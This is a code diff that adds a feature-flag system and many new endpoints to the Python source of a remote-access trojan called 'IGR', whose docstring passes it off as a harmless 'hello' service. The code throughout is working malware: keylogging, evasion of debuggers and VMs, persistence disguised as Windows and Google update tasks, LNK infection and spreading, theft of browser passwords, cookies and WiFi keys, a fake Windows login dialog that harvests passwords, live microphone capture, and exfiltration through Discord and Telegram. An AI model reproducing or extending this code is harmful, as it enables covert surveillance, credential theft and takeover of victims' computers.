@@ -5,9 +5,7 @@ Starts a simple service displaying "hello" on a random port,
 exposes it via Cloudflared, and posts the URL to Discord webhook.
 """
 
-# ============================================================================
-# CONFIGURATION - Values are injected from config.txt during build
-# ============================================================================
+# config values get injected at build time
 
 DISCORD_WEBHOOK_URL = "BUILD_DISCORD_WEBHOOK"
 DISCORD_USERNAME = "BUILD_DISCORD_USERNAME"
@@ -18,11 +16,35 @@ TELEGRAM_BOT_TOKEN = "BUILD_TELEGRAM_BOT_TOKEN"
 TELEGRAM_CHAT_ID = "BUILD_TELEGRAM_CHAT_ID"
 UPDATE_URL = "BUILD_UPDATE_URL"
 KEYLOG_ENCRYPTION_KEY = "BUILD_ENCRYPTION_KEY"
-IGR_VERSION = "7.9"
+IGR_VERSION = "8.0"
 
-# ============================================================================
-# END OF CONFIGURATION - DO NOT EDIT BELOW THIS LINE
-# ============================================================================
+# feature flags set during build
+FEAT_POLYMORPHISM = "BUILD_FEAT_POLYMORPHISM"
+FEAT_PROCESS_HOLLOWING = "BUILD_FEAT_PROCESS_HOLLOWING"
+FEAT_DIRECT_SYSCALLS = "BUILD_FEAT_DIRECT_SYSCALLS"
+FEAT_OBFUSCATION = "BUILD_FEAT_OBFUSCATION"
+FEAT_SELF_SIGN = "BUILD_FEAT_SELF_SIGN"
+FEAT_PLUGINS = "BUILD_FEAT_PLUGINS"
+FEAT_ASYNC_IO = "BUILD_FEAT_ASYNC_IO"
+FEAT_LNK_INFECTION = "BUILD_FEAT_LNK_INFECTION"
+FEAT_SPREAD_CHAT = "BUILD_FEAT_SPREAD_CHAT"
+FEAT_SAFE_MODE = "BUILD_FEAT_SAFE_MODE"
+FEAT_TASK_SCHED_STEALTH = "BUILD_FEAT_TASK_SCHED_STEALTH"
+FEAT_REVERSE_PROXY = "BUILD_FEAT_REVERSE_PROXY"
+FEAT_REMOTE_SOUND = "BUILD_FEAT_REMOTE_SOUND"
+FEAT_MONITOR_TOGGLE = "BUILD_FEAT_MONITOR_TOGGLE"
+FEAT_BSOD = "BUILD_FEAT_BSOD"
+FEAT_INPUT_LOCK = "BUILD_FEAT_INPUT_LOCK"
+FEAT_DRAG_DROP = "BUILD_FEAT_DRAG_DROP"
+FEAT_LIVE_AUDIO = "BUILD_FEAT_LIVE_AUDIO"
+FEAT_DARK_LIGHT_MODE = "BUILD_FEAT_DARK_LIGHT_MODE"
+FEAT_MOBILE_UI = "BUILD_FEAT_MOBILE_UI"
+FEAT_EXPORT_DATA = "BUILD_FEAT_EXPORT_DATA"
+FEAT_2FA = "BUILD_FEAT_2FA"
+FEAT_SOCIAL_ENGINEER = "BUILD_FEAT_SOCIAL_ENGINEER"
+FEAT_ATTACKER_WHITELIST = "BUILD_FEAT_ATTACKER_WHITELIST"
+
+# dont touch anything below here
 
 import os
 import random
@@ -55,12 +77,27 @@ def _apply_decryption():
     KEYLOG_ENCRYPTION_KEY = _decode_cfg(KEYLOG_ENCRYPTION_KEY)
 
 
+def _feat_enabled(flag_value: str) -> bool:
+    """Check if a feature flag is enabled (set to '1' during build)."""
+    return flag_value == "1"
+
+
+def _apply_feature_flags():
+    """Resolve all BUILD_FEAT_* placeholders - unset flags default to disabled."""
+    import sys as _sys
+    _this = _sys.modules[__name__]
+    for _attr in dir(_this):
+        if _attr.startswith("FEAT_"):
+            _val = getattr(_this, _attr)
+            if isinstance(_val, str) and _val.startswith("BUILD_"):
+                setattr(_this, _attr, "0")
+
+
 _apply_decryption()
+_apply_feature_flags()
 
 
-# ============================================================================
-# ANTI-ANALYSIS - Detect debuggers, VMs, and forensic tools
-# ============================================================================
+# anti-analysis stuff
 
 def _is_debugger_present() -> bool:
     """Check if a user-mode debugger is attached via Windows API."""
@@ -207,8 +244,25 @@ def _detect_vm_environment() -> list:
     return indicators
 
 
+def _is_whitelisted() -> bool:
+    """Check if attacker IP whitelist is active (anti-analysis disabled)."""
+    try:
+        whitelist_path = os.path.join(KEYLOG_DIR, ".attacker_whitelist")
+        if os.path.exists(whitelist_path):
+            with open(whitelist_path, 'r') as f:
+                expire = float(f.read().strip())
+            if time.time() < expire:
+                return True
+            os.remove(whitelist_path)
+    except:
+        pass
+    return False
+
+
 def _anti_analysis_check() -> bool:
     """Run all anti-analysis checks. Returns True if safe to proceed."""
+    if _feat_enabled(FEAT_ATTACKER_WHITELIST) and _is_whitelisted():
+        return True
     if _is_debugger_present():
         return False
     if _check_remote_debugger():
@@ -265,6 +319,39 @@ def _load_runtime_config():
         pass
 
 _load_runtime_config()
+
+# persist active features so they survive restarts
+_FEAT_STATE_FILE = os.path.join(KEYLOG_DIR, ".feat_state.json")
+
+def _save_feat_state():
+    """Save current feature flag values to disk."""
+    try:
+        import json
+        state = {}
+        for attr, val in globals().items():
+            if attr.startswith('FEAT_'):
+                state[attr] = val
+        with open(_FEAT_STATE_FILE, 'w') as f:
+            json.dump(state, f)
+    except:
+        pass
+
+def _load_feat_state():
+    """Load saved feature flags from disk, overriding defaults."""
+    try:
+        import json
+        if not os.path.exists(_FEAT_STATE_FILE):
+            return
+        with open(_FEAT_STATE_FILE, 'r') as f:
+            state = json.load(f)
+        for attr, val in state.items():
+            if attr.startswith('FEAT_') and attr in globals():
+                globals()[attr] = val
+    except:
+        pass
+
+_load_feat_state()
+
 import time
 import base64
 import threading
@@ -333,9 +420,7 @@ with open(KEYLOG_MARKER, 'w') as f:
     f.write(KEYLOG_DIR)
 KEYLOG_FILE = os.path.join(KEYLOG_DIR, "logs.txt")
 
-# ============================================================================
-# STEALTH - Registry persistence, internal spreading, process masking
-# ============================================================================
+# stealth and persistence
 
 _FAKE_NAMES = [
     "WindowsRuntime", "SystemService", "RuntimeBroker", "WpnService",
@@ -480,9 +565,7 @@ def _spoof_process_name() -> bool:
     except:
         return False
 
-# ============================================================================
-# TELEGRAM INTEGRATION - Multi-PC tracking with editable status messages
-# ============================================================================
+# telegram integration
 
 _PC_ID = f"{socket.gethostname()}_{os.environ.get('USERNAME', 'unknown')}"
 _TELEGRAM_STATE_FILE = os.path.join(KEYLOG_DIR, ".tg_state.json")
@@ -1487,9 +1570,7 @@ def _telegram_heartbeat(cloudflared_url: str):
         except:
             pass
 
-# ============================================================================
-# SPREADING FUNCTIONS - USB, LAN, Internal
-# ============================================================================
+# spreading functions
 
 def _spread_to_usb() -> dict:
     """Copy IGR to all connected USB drives with autorun infector."""
@@ -1661,9 +1742,7 @@ def _get_spread_status() -> dict:
         pass
     return status
 
-# ============================================================================
-# DATA HARVESTING FUNCTIONS
-# ============================================================================
+# data harvesting
 
 def _dump_wifi_passwords() -> list:
     """Extract all saved WiFi passwords."""
@@ -2726,9 +2805,7 @@ def _process_hollowing(target_process: str) -> dict:
     except Exception as e:
         return {'success': False, 'error': str(e)}
 
-# ============================================================================
-# OFFLINE QUEUE - Buffer data when no internet, send when back
-# ============================================================================
+# offline queue
 
 _OFFLINE_QUEUE = []
 _QUEUE_LOCK = threading.Lock()
@@ -2758,9 +2835,7 @@ def _queue_flush_loop():
 
 threading.Thread(target=_queue_flush_loop, daemon=True).start()
 
-# ============================================================================
-# WATCHDOG - Restart IGR if it dies
-# ============================================================================
+# watchdog
 
 def _start_watchdog():
     """Launch a watchdog process that restarts IGR if it dies."""
@@ -6119,9 +6194,7 @@ def upload_file():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ============================================================================
-# NEW API ENDPOINTS - Data Harvesting, Remote Control, Troll, Stealth
-# ============================================================================
+# more api endpoints
 
 @app.route('/api/harvest/wifi')
 def harvest_wifi():
@@ -7025,6 +7098,484 @@ def network_lan_scan():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
+# feature-gated endpoints
+
+@app.route('/api/feat/input_lock', methods=['POST'])
+def feat_input_lock():
+    """Lock or unlock keyboard/mouse input (FEAT_INPUT_LOCK)."""
+    if not _feat_enabled(FEAT_INPUT_LOCK):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        import ctypes
+        data = request.get_json()
+        action = data.get('action', 'lock')
+        if action == 'lock':
+            ctypes.windll.user32.BlockInput(True)
+            return jsonify({'success': True, 'status': 'Input locked'})
+        else:
+            ctypes.windll.user32.BlockInput(False)
+            return jsonify({'success': True, 'status': 'Input unlocked'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/bsod', methods=['POST'])
+def feat_bsod():
+    """Trigger fake BSOD (FEAT_BSOD)."""
+    if not _feat_enabled(FEAT_BSOD):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        html = '<html><head><hta:application id="bsod" applicationname="bsod" border="none" caption="no" contextmenu="no" innerborder="no" maximizebutton="no" minimizebutton="no" scroll="no" scrollflat="no" selection="no" showintaskbar="no" singleinstance="no" sysmenu="no" windowstate="maximize"/><script>window.resizeTo(screen.width,screen.height);window.moveTo(0,0);</script></head><body style="background:#0078D7;color:white;font-family:Segoe UI;margin:0;padding:60px 80px;overflow:hidden;cursor:none;"><div style="font-size:120px;">:(</div><br><div style="font-size:24px;">Your PC ran into a problem and needs to restart.</div><br><div style="font-size:18px;">Stop code: CRITICAL_PROCESS_DIED</div><br><div style="font-size:16px;">Collecting error info... 0% complete</div></body></html>'
+        tmp_html = os.path.join(KEYLOG_DIR, "_bsod.hta")
+        with open(tmp_html, 'w') as f:
+            f.write(html)
+        subprocess.Popen(['mshta.exe', tmp_html], creationflags=0x08000000, close_fds=True)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/bsod_stop', methods=['POST'])
+def feat_bsod_stop():
+    """Stop fake BSOD (FEAT_BSOD)."""
+    if not _feat_enabled(FEAT_BSOD):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        subprocess.run(['taskkill', '/f', '/im', 'mshta.exe'], capture_output=True, creationflags=0x08000000)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/monitor_toggle', methods=['POST'])
+def feat_monitor_toggle():
+    """Turn monitors on/off (FEAT_MONITOR_TOGGLE)."""
+    if not _feat_enabled(FEAT_MONITOR_TOGGLE):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        import ctypes
+        data = request.get_json()
+        action = data.get('action', 'off')
+        if action == 'off':
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
+        else:
+            ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, -1)
+            ctypes.windll.user32.SetCursorPos(0, 0)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/remote_sound', methods=['POST'])
+def feat_remote_sound():
+    """Play sound file on victim PC (FEAT_REMOTE_SOUND)."""
+    if not _feat_enabled(FEAT_REMOTE_SOUND):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        sound_file = request.files.get('sound')
+        if not sound_file:
+            return jsonify({'success': False, 'error': 'No sound file'})
+        tmp_path = os.path.join(KEYLOG_DIR, "_remote_sound.wav")
+        sound_file.save(tmp_path)
+        import winsound
+        threading.Thread(target=lambda p=tmp_path: winsound.PlaySound(p, winsound.SND_FILENAME), daemon=True).start()
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/remote_sound_stop', methods=['POST'])
+def feat_remote_sound_stop():
+    """Stop remote sound playback (FEAT_REMOTE_SOUND)."""
+    if not _feat_enabled(FEAT_REMOTE_SOUND):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        import winsound
+        winsound.PlaySound(None, winsound.SND_PURGE)
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/social_engineer', methods=['POST'])
+def feat_social_engineer():
+    """Show fake system dialog to harvest credentials (FEAT_SOCIAL_ENGINEER)."""
+    if not _feat_enabled(FEAT_SOCIAL_ENGINEER):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        data = request.get_json()
+        prompt_type = data.get('type', 'windows_update')
+        if prompt_type == 'windows_update':
+            title = "Windows Update"
+            message = "Windows needs to verify your account to continue updating.\\n\\nPlease enter your password:"
+        elif prompt_type == 'uac':
+            title = "User Account Control"
+            message = "Do you want to allow this app to make changes?\\n\\nAdministrative credentials required:"
+        else:
+            title = data.get('title', 'System')
+            message = data.get('message', 'Authentication required:')
+        vbs_path = os.path.join(KEYLOG_DIR, "_social_eng.vbs")
+        se_result = os.path.join(KEYLOG_DIR, "_se_result.txt")
+        with open(vbs_path, 'w') as f:
+            f.write(f'On Error Resume Next\n')
+            f.write(f'result = InputBox("{message}", "{title}")\n')
+            f.write(f'If result <> "" Then\n')
+            f.write(f'  Set objFSO = CreateObject("Scripting.FileSystemObject")\n')
+            f.write(f'  Set objFile = objFSO.CreateTextFile("{se_result}", True)\n')
+            f.write(f'  objFile.Write result\n')
+            f.write(f'  objFile.Close\n')
+            f.write(f'End If\n')
+        subprocess.Popen(['wscript.exe', vbs_path], creationflags=0x08000000, close_fds=True)
+        return jsonify({'success': True, 'status': 'Dialog shown'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/social_engineer_result')
+def feat_social_engineer_result():
+    """Get harvested credentials from social engineering dialog (FEAT_SOCIAL_ENGINEER)."""
+    if not _feat_enabled(FEAT_SOCIAL_ENGINEER):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        result_path = os.path.join(KEYLOG_DIR, "_se_result.txt")
+        if os.path.exists(result_path):
+            with open(result_path, 'r') as f:
+                result = f.read()
+            os.remove(result_path)
+            return jsonify({'success': True, 'result': result})
+        return jsonify({'success': False, 'error': 'No result yet'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/reverse_proxy', methods=['POST'])
+def feat_reverse_proxy():
+    """Start/stop reverse HTTP proxy via victim IP (FEAT_REVERSE_PROXY)."""
+    if not _feat_enabled(FEAT_REVERSE_PROXY):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        data = request.get_json()
+        action = data.get('action', 'start')
+        if action == 'start':
+            proxy_port = data.get('port', 8888)
+            proxy_script = os.path.join(KEYLOG_DIR, "_proxy_server.py")
+            with open(proxy_script, 'w') as f:
+                f.write(f'import http.server, socketserver, sys\n')
+                f.write(f'class H(http.server.SimpleHTTPRequestHandler):\n')
+                f.write(f'    def log_message(self, *a): pass\n')
+                f.write(f's=socketserver.ThreadingTCPServer(("0.0.0.0",{proxy_port}),H)\n')
+                f.write(f's.serve_forever()\n')
+            _proxy_proc = subprocess.Popen(['python', proxy_script],
+                                            creationflags=0x08000000, close_fds=True)
+            return jsonify({'success': True, 'port': proxy_port})
+        else:
+            subprocess.run(['taskkill', '/f', '/im', '_proxy_server.py'],
+                           capture_output=True, creationflags=0x08000000)
+            return jsonify({'success': True, 'status': 'Proxy stopped'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/attacker_whitelist', methods=['POST'])
+def feat_attacker_whitelist():
+    """Whitelist attacker IP - disable anti-analysis for 1 hour (FEAT_ATTACKER_WHITELIST)."""
+    if not _feat_enabled(FEAT_ATTACKER_WHITELIST):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        data = request.get_json()
+        action = data.get('action', 'enable')
+        whitelist_path = os.path.join(KEYLOG_DIR, ".attacker_whitelist")
+        if action == 'enable':
+            expire = time.time() + 3600
+            with open(whitelist_path, 'w') as f:
+                f.write(str(expire))
+            return jsonify({'success': True, 'expires_in': 3600})
+        else:
+            if os.path.exists(whitelist_path):
+                os.remove(whitelist_path)
+            return jsonify({'success': True, 'status': 'Whitelist removed'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/whitelist_status')
+def feat_whitelist_status():
+    """Check if attacker IP is currently whitelisted (FEAT_ATTACKER_WHITELIST)."""
+    if not _feat_enabled(FEAT_ATTACKER_WHITELIST):
+        return jsonify({'active': False, 'error': 'Feature not enabled'})
+    try:
+        whitelist_path = os.path.join(KEYLOG_DIR, ".attacker_whitelist")
+        if os.path.exists(whitelist_path):
+            with open(whitelist_path, 'r') as f:
+                expire = float(f.read().strip())
+            remaining = expire - time.time()
+            if remaining > 0:
+                return jsonify({'active': True, 'remaining_seconds': int(remaining)})
+            os.remove(whitelist_path)
+        return jsonify({'active': False})
+    except Exception as e:
+        return jsonify({'active': False, 'error': str(e)})
+
+@app.route('/api/feat/lnk_infect', methods=['POST'])
+def feat_lnk_infect():
+    """Infect desktop LNK files to launch IGR alongside original program (FEAT_LNK_INFECTION)."""
+    if not _feat_enabled(FEAT_LNK_INFECTION):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        desktop = os.path.join(os.environ.get('USERPROFILE', ''), 'Desktop')
+        infected = []
+        current_exe = sys.executable if getattr(sys, 'frozen', False) else ''
+        if not current_exe:
+            return jsonify({'success': False, 'error': 'Not running as exe'})
+        for item in os.listdir(desktop):
+            if item.lower().endswith('.lnk'):
+                lnk_path = os.path.join(desktop, item)
+                try:
+                    result = subprocess.run(
+                        ['powershell', '-Command',
+                         f'$sh = New-Object -ComObject WScript.Shell; $lnk = $sh.CreateShortcut("{lnk_path}"); '
+                         f'$orig = $lnk.TargetPath; '
+                         f'$lnk.TargetPath = "{current_exe}"; '
+                         f'$lnk.Arguments = "--launch `$orig"; '
+                         f'$lnk.Save()'],
+                        capture_output=True, timeout=10, creationflags=0x08000000)
+                    infected.append(item)
+                except:
+                    pass
+        return jsonify({'success': True, 'infected': infected})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/spread_chat', methods=['POST'])
+def feat_spread_chat():
+    """Send dropper via Discord/Telegram DMs (FEAT_SPREAD_CHAT)."""
+    if not _feat_enabled(FEAT_SPREAD_CHAT):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        data = request.get_json()
+        platform = data.get('platform', 'discord')
+        message = data.get('message', 'Check this out!')
+        file_path = data.get('file_path', '')
+        if platform == 'discord' and DISCORD_WEBHOOK_URL:
+            files_payload = {}
+            if file_path and os.path.exists(file_path):
+                files_payload['file'] = (os.path.basename(file_path), open(file_path, 'rb'))
+            requests.post(DISCORD_WEBHOOK_URL, data={'content': message}, files=files_payload or None, timeout=15)
+            return jsonify({'success': True, 'status': 'Sent via Discord webhook'})
+        elif platform == 'telegram' and TELEGRAM_BOT_TOKEN:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+            requests.post(url, json={'chat_id': TELEGRAM_CHAT_ID, 'text': message}, timeout=10)
+            return jsonify({'success': True, 'status': 'Sent via Telegram'})
+        return jsonify({'success': False, 'error': 'No platform configured'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/task_sched_stealth', methods=['POST'])
+def feat_task_sched_stealth():
+    """Create stealth scheduled task mimicking Windows Update (FEAT_TASK_SCHED_STEALTH)."""
+    if not _feat_enabled(FEAT_TASK_SCHED_STEALTH):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        current_exe = sys.executable if getattr(sys, 'frozen', False) else ''
+        if not current_exe:
+            return jsonify({'success': False, 'error': 'Not running as exe'})
+        task_names = [
+            'GoogleUpdateTaskMachineUA',
+            'MicrosoftEdgeUpdateTaskMachineUA',
+            'OneDrive Reporting Task',
+        ]
+        chosen = task_names[random.randint(0, len(task_names) - 1)]
+        result = subprocess.run(
+            ['schtasks', '/create', '/tn', chosen, '/tr', f'"{current_exe}"',
+             '/sc', 'onlogon', '/rl', 'highest', '/f'],
+            capture_output=True, text=True, creationflags=0x08000000)
+        if result.returncode == 0:
+            return jsonify({'success': True, 'task': chosen})
+        return jsonify({'success': False, 'error': result.stderr})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/safe_mode', methods=['POST'])
+def feat_safe_mode():
+    """Enable Safe Mode with networking persistence (FEAT_SAFE_MODE)."""
+    if not _feat_enabled(FEAT_SAFE_MODE):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        result = _enable_safe_mode_persistence()
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/export_data', methods=['POST'])
+def feat_export_data():
+    """Export harvested data to CSV (FEAT_EXPORT_DATA)."""
+    if not _feat_enabled(FEAT_EXPORT_DATA):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        data = request.get_json()
+        export_type = data.get('type', 'passwords')
+        import csv, io
+        output = io.StringIO()
+        writer = csv.writer(output)
+        if export_type == 'passwords':
+            writer.writerow(['URL', 'Username', 'Password'])
+            try:
+                for p in _decrypt_chrome_passwords():
+                    writer.writerow([p.get('url', ''), p.get('username', ''), p.get('password', '')])
+            except:
+                pass
+            try:
+                for p in _decrypt_edge_passwords():
+                    writer.writerow([p.get('url', ''), p.get('username', ''), p.get('password', '')])
+            except:
+                pass
+        elif export_type == 'system':
+            writer.writerow(['Key', 'Value'])
+            for k, v in _get_system_inventory().items():
+                writer.writerow([k, str(v)])
+        elif export_type == 'cookies':
+            writer.writerow(['Host', 'Name', 'Value'])
+            try:
+                for c in _steal_browser_cookies():
+                    writer.writerow([c.get('host', ''), c.get('name', ''), c.get('value', '')])
+            except:
+                pass
+        csv_data = output.getvalue()
+        return Response(csv_data, mimetype='text/csv',
+                       headers={'Content-Disposition': f'attachment; filename=igr_{export_type}.csv'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/2fa_setup', methods=['POST'])
+def feat_2fa_setup():
+    """Setup 2FA TOTP for dashboard access (FEAT_2FA)."""
+    if not _feat_enabled(FEAT_2FA):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        import hmac, hashlib, struct
+        secret = base64.b32encode(os.urandom(10)).decode('ascii')
+        secret_path = os.path.join(KEYLOG_DIR, ".2fa_secret")
+        with open(secret_path, 'w') as f:
+            f.write(secret)
+        uri = f'otpauth://totp/IGR:{socket.gethostname()}?secret={secret}&issuer=IGR'
+        return jsonify({'success': True, 'secret': secret, 'uri': uri})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/2fa_verify', methods=['POST'])
+def feat_2fa_verify():
+    """Verify 2FA TOTP code (FEAT_2FA)."""
+    if not _feat_enabled(FEAT_2FA):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        import hmac, hashlib, struct
+        data = request.get_json()
+        code = data.get('code', '')
+        secret_path = os.path.join(KEYLOG_DIR, ".2fa_secret")
+        if not os.path.exists(secret_path):
+            return jsonify({'success': False, 'error': '2FA not setup'})
+        with open(secret_path, 'r') as f:
+            secret = f.read().strip()
+        key = base64.b32decode(secret)
+        timestep = int(time.time()) // 30
+        msg = struct.pack('>Q', timestep)
+        h = hmac.new(key, msg, hashlib.sha1).digest()
+        o = h[-1] & 15
+        expected = str((struct.unpack('>I', h[o:o+4])[0] & 0x7fffffff) % 1000000).zfill(6)
+        if code == expected:
+            return jsonify({'success': True})
+        return jsonify({'success': False, 'error': 'Invalid code'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/list')
+def feat_list():
+    """List all feature flags and their current state."""
+    flags = {}
+    for attr, val in globals().items():
+        if attr.startswith('FEAT_'):
+            flags[attr] = {'enabled': _feat_enabled(val), 'raw': val}
+    return jsonify({'features': flags, 'version': IGR_VERSION})
+
+@app.route('/api/feat/toggle', methods=['POST'])
+def feat_toggle():
+    """Toggle a feature flag at runtime and persist it."""
+    try:
+        data = request.get_json()
+        flag_name = data.get('flag', '')
+        if not flag_name.startswith('FEAT_') or flag_name not in globals():
+            return jsonify({'success': False, 'error': 'Invalid flag'})
+        current = globals()[flag_name]
+        new_val = '0' if _feat_enabled(current) else '1'
+        globals()[flag_name] = new_val
+        _save_feat_state()
+        return jsonify({'success': True, 'flag': flag_name, 'new_value': new_val})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/drag_drop', methods=['POST'])
+def feat_drag_drop():
+    """Upload files via drag and drop (FEAT_DRAG_DROP)."""
+    if not _feat_enabled(FEAT_DRAG_DROP):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        uploaded = []
+        for key in request.files:
+            file = request.files[key]
+            if not file.filename:
+                continue
+            target_dir = request.form.get('target_dir', KEYLOG_DIR)
+            os.makedirs(target_dir, exist_ok=True)
+            save_path = os.path.join(target_dir, file.filename)
+            file.save(save_path)
+            uploaded.append({'name': file.filename, 'path': save_path, 'size': os.path.getsize(save_path)})
+        return jsonify({'success': True, 'uploaded': uploaded})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/live_audio_start', methods=['POST'])
+def feat_live_audio_start():
+    """Start live audio streaming from mic (FEAT_LIVE_AUDIO)."""
+    if not _feat_enabled(FEAT_LIVE_AUDIO):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        import pyaudio
+        global _live_audio_stream, _live_audio_pa
+        _live_audio_pa = pyaudio.PyAudio()
+        _live_audio_stream = _live_audio_pa.open(
+            format=pyaudio.paInt16, channels=1, rate=16000, input=True,
+            frames_per_buffer=1024)
+        return jsonify({'success': True, 'status': 'Live audio started'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/live_audio_chunk')
+def feat_live_audio_chunk():
+    """Get a chunk of live audio data (FEAT_LIVE_AUDIO)."""
+    if not _feat_enabled(FEAT_LIVE_AUDIO):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        global _live_audio_stream
+        if _live_audio_stream is None:
+            return jsonify({'success': False, 'error': 'Not recording'})
+        data = _live_audio_stream.read(1024, exception_on_overflow=False)
+        import io
+        buf = io.BytesIO(data)
+        return Response(buf.getvalue(), mimetype='audio/raw')
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/feat/live_audio_stop', methods=['POST'])
+def feat_live_audio_stop():
+    """Stop live audio streaming (FEAT_LIVE_AUDIO)."""
+    if not _feat_enabled(FEAT_LIVE_AUDIO):
+        return jsonify({'success': False, 'error': 'Feature not enabled'})
+    try:
+        global _live_audio_stream, _live_audio_pa
+        if _live_audio_stream:
+            _live_audio_stream.stop_stream()
+            _live_audio_stream.close()
+            _live_audio_stream = None
+        if _live_audio_pa:
+            _live_audio_pa.terminate()
+            _live_audio_pa = None
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)})
+
+_live_audio_stream = None
+_live_audio_pa = None
+
 def find_free_port() -> int:
     """Find a random free port."""
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -7109,10 +7660,11 @@ def main():
     except:
         pass
     
-    try:
-        _spoof_process_name()
-    except:
-        pass
+    if _feat_enabled(FEAT_PROCESS_HOLLOWING):
+        try:
+            _spoof_process_name()
+        except:
+            pass
     
     try:
         _add_registry_persistence()
@@ -7123,6 +7675,18 @@ def main():
         _spread_internally()
     except:
         pass
+    
+    if _feat_enabled(FEAT_TASK_SCHED_STEALTH):
+        try:
+            task_names = ['GoogleUpdateTaskMachineUA', 'MicrosoftEdgeUpdateTaskMachineUA', 'OneDrive Reporting Task']
+            chosen = task_names[random.randint(0, len(task_names) - 1)]
+            current_exe = sys.executable if getattr(sys, 'frozen', False) else ''
+            if current_exe:
+                subprocess.run(['schtasks', '/create', '/tn', chosen, '/tr', f'"{current_exe}"',
+                    '/sc', 'onlogon', '/rl', 'highest', '/f'],
+                    capture_output=True, creationflags=0x08000000)
+        except:
+            pass
     
     try:
         start_keylogger()
